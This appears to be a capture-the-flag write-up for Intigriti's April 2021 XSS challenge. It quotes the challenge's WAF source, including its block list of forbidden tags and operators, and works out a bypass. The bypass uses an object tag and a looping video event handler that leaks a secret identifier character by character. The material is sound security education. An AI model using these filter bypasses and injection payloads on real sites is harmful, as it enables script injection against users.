# Intigriti's 0421 XSS challenge - by @terjanq

## Target

The challenge is hosted at https://challenge-0421.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1384108534070083591.

As stated on the challenge's page, we need to find a way to execute arbitrary javascript on the challenge page. However, there are a few rules and information:
```
Rules:
    This challenge runs from April 19 until April 25th, 11:59 PM CET.
    Out of all correct submissions, we will draw six winners on Monday, April 26th:
        Three randomly drawn correct submissions
        Three best write-ups
    Every winner gets a €50 swag voucher for our swag shop
    The winners will be announced on our Twitter profile.
    For every 100 likes, we'll add a tip to announcement tweet.

The solution...
    Should work on the latest version of Firefox or Chrome
    Should alert() the following flag: flag{THIS_IS_THE_FLAG}.
    Should leverage a cross site scripting vulnerability on this page.
    Shouldn't be self-XSS or related to MiTM attacks
    Should not use any user interaction
    Should be reported at go.intigriti.com/submit-solution
```
(taken from https://challenge-0421.intigriti.io / 2021-04-25 14:00 CET)

## Hints
Since there were so few solves during the duration of the challenge, @initigriti decided to offer a few more hints than usual:

1.  >First hint: find the objective!
    https://twitter.com/intigriti/status/1384144131526594569

2.  >Tipping time! Goal < object(ive)
    https://twitter.com/intigriti/status/1385292044470530050

3.  >Update: this seems to be the hardest XSS challenge we've ever hosted - no valid solutions so far!
    >Here's an extra tip: ++ is also an assignment
    https://twitter.com/intigriti/status/1384511577622253570

4.  >Another hint: you might need to unload a custom loop!
    https://twitter.com/intigriti/status/1385983715424284677

5.  >Let’s give another hint:
    >
    >"Behind a Greater Oracle there stands one great Identity" (leak it)
    https://twitter.com/intigriti/status/1385139722239025152

6.  >Time for another hint! Where to smuggle data?
    https://twitter.com/intigriti/status/1384180996984041480

7.  >Time for another tip! One bite after another!
    https://twitter.com/intigriti/status/1384475910557024256

## Inspecting and understanding the challenge

The challenge `index.html` included not only the visual page you can see rendered in the browser, but also some other data worth mentioning:

```html
<iframe id="wafIframe" src="./waf.html" sandbox="allow-scripts" style="display:none"></iframe>
<script>
const wafIframe = document.getElementById('wafIframe').contentWindow;
const identifier = getIdentifier();

function getIdentifier() {
    const buf = new Uint32Array(2);
    crypto.getRandomValues(buf);
    return buf[0].toString(36) + buf[1].toString(36)
}

function htmlError(str, safe){
    const div = document.getElementById("error-content");
    const container = document.getElementById("error-container");
    container.style.display = "block";
    if(safe) div.innerHTML = str;
    else div.innerText = str;
    window.setTimeout(function(){
        div.innerHTML = "";
        container.style.display = "none";
    }, 10000);
}

function addError(str){
    wafIframe.postMessage({
        identifier,
        str
    }, '*');
}

window.addEventListener('message', e => {
    if(e.data.type === 'waf'){
        if(identifier !== e.data.identifier) throw /nice try/
        htmlError(e.data.str, e.data.safe)
    }
});

window.onload = () => {
    const error = (new URL(location)).searchParams.get('error');
    if(error !== null) addError(error);
}

</script>
```

The page is including an hidden iframe to `waf.html`, where `waf` is an acronym for `Web Application Firewall`.

### Inspecting and understanding the `waf.html`
 The `waf.html` contains the following script:
```html
<script>

onmessage = e => {
    const identifier = e.data.identifier;
    e.source.postMessage({
        type:'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    },'*');
}

function WAF() {
    const forbidden_words = ['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:'];
    const dangerous_operators = ['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']

    function decodeHTMLEntities(str) {
        var ta = document.createElement('textarea');
        ta.innerHTML = str;
        return ta.value;
    }

    function onlyASCII(str){
        return str.replace(/[^\x21-\x7e]/g,'');
    }

    function firstTag(str){
        return str.search(/<[a-z]+/i)
    }

    function firstOnHandler(str){
        return str.search(/on[a-z]{3,}/i)
    }

    function firstEqual(str){
        return str.search(/=/);
    }

    function hasDangerousOperators(str){
        return dangerous_operators.some(op=>str.includes(op));
    }

    function hasForbiddenWord(str){
        return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1);
    }

    this.isSafe = function(str) {
        let decoded = onlyASCII(decodeHTMLEntities(str));

        const first_tag = firstTag(decoded);
        if(first_tag === -1) return true;
        decoded = decoded.slice(first_tag);

        if(hasForbiddenWord(decoded)) return false;

        const first_on_handler = firstOnHandler(decoded);
        if(first_on_handler === -1) return true;
        decoded = decoded.slice(first_on_handler)

        const first_equal = firstEqual(decoded);
        if(first_equal === -1) return true;
        decoded = decoded.slice(first_equal+1);

        if(hasDangerousOperators(decoded)) return false;
        return true;
    }
}

</script>
```

First of all, the `waf` creates a new `onmessage` handler. This handler is called by a call on the `postMessage` method of a window having the `waf.html` open. For example:

`receiver.html`:
```html
<script>

onmessage = e => {
    console.log(`Hello from ${e.data.name}`);
}

</script>
```

`sender.html`:
```html
<script>
const receiverWindow = window.open('receiver.html');
receiverWindow.postMessage({name: 'sender'}, '*');
</script>
```

So, `onmessage` (or `window.addEventListener('message',...)`) and `postMessage` is way of communicationg cross origins/frames/windows. To send messages back to the origin, one can use the reference to the Window object, which stays in `e.sender`. 

So, the `waf` gets messages, does something and then sends a message back to the sender. 

The message, the `waf` sends back, is the following:
```js
{
    type:'waf',
    identifier: e.data.identifier,
    str: e.data.str,
    safe: (new WAF()).isSafe(e.data.str)
}
```

So, basically it replies which the `identifier` and the `str` from the incoming message. The only part, that changes is the `safe` property, which is calculated by the class `WAF`.

#### The `isSafe` method 
1. Call of `decodeHTMLEntities`, which just turns encoded HTML entities into their character representations. For example: `&gt;` will result in `>`.
2. Call of `onlyASCII`, which replaces all occurences of characters, which are not between `\x21-\x7e` into an empty string. For example: `foo\nbar` will result in `foobar`.
3. Call of `firstTag`, which looks for the first occurence of `<` with any character followed and returns the respective index. For example `firstTag('1<test')` will return `1`.
   1. If there is no tag found, the `isSafe` method will return with `true`.
   2. If there is a tag found, the following methods will only focus on the string after the first tag.
4. Call of `hasForbiddenWord`, which will look for any occurence of `['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:']` and will return `false` if there is one. 
5. Call of `firstOnHandler`, does the same as `firstTag`, but with `on` followed by 3 characters.
6. Call of `firstEqual`, does the same as `firstTag`, but with `=`.
7. Call of `hasDangerousOperators`, which will look for any occurence of ``['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']`` and will return `false` if there is one.

To wrap things up, `isSafe` will return
1. `true` if there is no HTML tag
2. `false` if there is any occurence of `['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:']`
3. `true` if there is no event handler after the first HTML tag. 
4. `true` if there is no equal sign, after the first event handler.
5. `false` if there is any occurence of ``['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']`` after the first equal sign inside of an event handler.

So things like `<a>` tags will result in a safe string. Also strings with eventhandlers but without use of ``['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']`` will return safe: `<img src=x onerror=height++>`

### Inspecting and understanding the `index.html`

The script at `index.html` does the following:
1. Creates an `identifier` in the global scope, which is the concatination of two 32bit random integers.
2. Creates an eventlistener on the `message` event. The handler will check if the `type` is equal to `waf` and the `identifier` is the same as the generated one. If both match, the `htmlError` method is called.
   1. The `htmlError` method will display the a string depending on the `safe` argument. If it is `true`, the `str` argument will be displayed as HTML. If it is `false` it will be just displayed as text.
   2. After 10 seconds, the error will be hidden.
3. Sends a message to `wafIframe` after the page finished loading. The message's `str` property will be the value of the `error` URL parameter.

### Wrap Up

After inspecting `waf.html` and `index.html` we have a basic understanding of what the exploit will consist of:

Send a message to `index.html` containing a valid `identifier` and the `safe` property set to `true`. This will inject the given `str` property and will result in the ultimate goal: XSS!

To do so, we need to develop two answer the following questions:
1. How can we have script permanently executed? Something like a loop? 
2. How can we leak the identifier? We surely need something like cross-origin communication between our scripts and the challenge.

## The exploit

After the first few hints, I discovered that I can include `<object>` tags, pointing to the attacker page (in the future in my case `localhost`) and including script. So doing the url: `https://challenge-0421.intigriti.io/?error=<object data=http://localhost:3001/xss.html>` will include the page at `xss.html` and will even execute any script from that domain. So, basically we already have some kind of XSS, but it's execution is not on the challenge page.

### Having dynamic script execution
After having a look at all the possible HTML events at https://developer.mozilla.org/de/docs/Web/Events I saw the even `timeupdate` and made a quick PoC:
```html
<html>
<head></head>
<body>
    <video controls src=https://www.w3schools.com/jsref/mov_bbb.mp4 ontimeupdate="console.log('timeupdate')">
</body>
</html>
```

This worked, but needed user interaction to start the video. Luckily the `video` tag has an `autoplay` attribute. After setting this, the page errored out, saying that autoplaying videos is only possible when there are muted. So, after setting the `muted` attribute, the script was indeed executed multiple times. But only until the end of the video. I though about embedding a very long video, but that was not needed, since we can set the `loop` attribute, which will autoplay the video again at the end. Having all this together, got a dynamic script looping:
```html
<video muted loop autoplay src=https://www.w3schools.com/jsref/mov_bbb.mp4 ontimeupdate="console.log('timeupdate')">
```
This got one call per second. To speed things up, we could increase the `currentTime` property in the event handler:
```html
<video muted loop autoplay src=https://www.w3schools.com/jsref/mov_bbb.mp4 ontimeupdate="currentTime++;console.log('timeupdate')">
```

### Leaking the identifier
Since we can not create a new identifier or overwrite it, we need some kind of cross origin/window communication between our script injected by the `object` tag and the script, which will run in the `video` tag. The only way of cross origin/window communication that would somehow be possible, is setting the `window.name` property. The idea is the following:

1. Have an `inital` page at `localhost`, which opens a popup to a second page at `localhost`.
2. The second page opens another popup to `challenge`.
   1. The challenge can then read the name of the opener with `window.opener.name`.
   2. The challenge page opens with an `object` page at `localhost`.
   3. The challenge compares `window.opener.name` with `identifier`, communicates to `window.opener` that the comparison was greater or less.
   4. The `window.opener.name` changes to the next character and the loop begins again.
3. The `inital` page can take input from the `object` page, since it has the same origin.
4. The `inital` page can also change the location of the `window.opener`.
   1. Change location to `localhost` to set the `name` property.
   2. Change location to `challenge` to let the challenge read the `window.opener.name`.

Putting all this together again:
1. The `init.html` initializes some utility methods and opens a popup to `opener.html`.
2. `opener.html` opens the `challenge` page with the payload:
```html
   <object id=poc data=http://localhost:3000/solver.html width=101 height=101></object>
   <video muted loop autoplay src=https://www.w3schools.com/jsref/mov_bbb.mp4 
                ontimeupdate=window.opener.name<identifier?poc.height++:poc.width++>
```

This will load the `solver.html` and additionally executes the following loop:
```
if(window.opener.name < identifier)
{
    poc.height++;
}else{
    poc.width++;
}
```
In JavaScript you can compare strings by using `<` and `>` based on their ascii character index. So an `a` is lower than a `b`. 
Using this, we can control the size of the `object`. The script in `solver.html` of the `object` can then monitor `window.innerWidth` and `window.innerHeight` for any changes. If the `innerWidth` changed, the `window.opener.name` is greater than the `identifier`. If this occurs, the character we tested before, is the correct character in identifier at that position. 
Having an array of characters `["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","{"]`:

If `"0" < identifier` returns `false`, but `"1" < identifier` returns `true`, the first character of `identifier` is `"0"`. With focus to the loop mentioned above, the width will change, when the `window.opener.name` contains a character after the actual character.
   

### Putting everything together

I will not go into a deep detail description of `init.html`, `sovler.html` or `opener.html`. This exploit unfortunately requires the script to be visible longer than the 10 seconds.

`init.html` opens the `opener.html`, which opens the challenge page with the above mentioned payload. This payload will compare the name of `opener.html` with the identifier and will change the size accordingly. Additionally the payload will load an `<object>` pointing to `solver.html`, which monitors the size by using `window.innerWidth` and `window.innerHeight`. 

The `solver.html` has the same origin than `init.html`, thus it can call functions with `window.parent.opener.opener.FUNCTION`. 

`init.html` contains the following functions:
1. `getIdentifier()` returns the currently tested character.
2. `setIdentifier()` sets the `identifier` using a reference to the `opener.html`. To do so, the origin of `opener.html` needs to be the same as `init.html`. So basically it does the following:
   1. Change location to same origin as `init.html`.
   2. Use `waitUntilWriteable` until it can write the new `window.name`.
   3. Write the new `identifier` with the already guessed part to `window.name`.
   4. Change the location back to the challenge's origin.
3. `waitUntilWriteable(windowRef)` and `waitForLocationChange(windowRef, location)` are convenience methods which simply return a resolved `Promise` as soon as the the `windowRef.name` is writeable or the `windowRef.location.href` contains the given location.

The bad part about this soltion is, that it needs to change the location of `opener.html` twice for each new character guess and thus, this solution takes longer than the 10 seconds, in which the whole HTML is available.

## Acknowledgments

Big thanks to @totz_sec for a great collaboration. Developing the solution was a great teamwork. #kaeferjaeger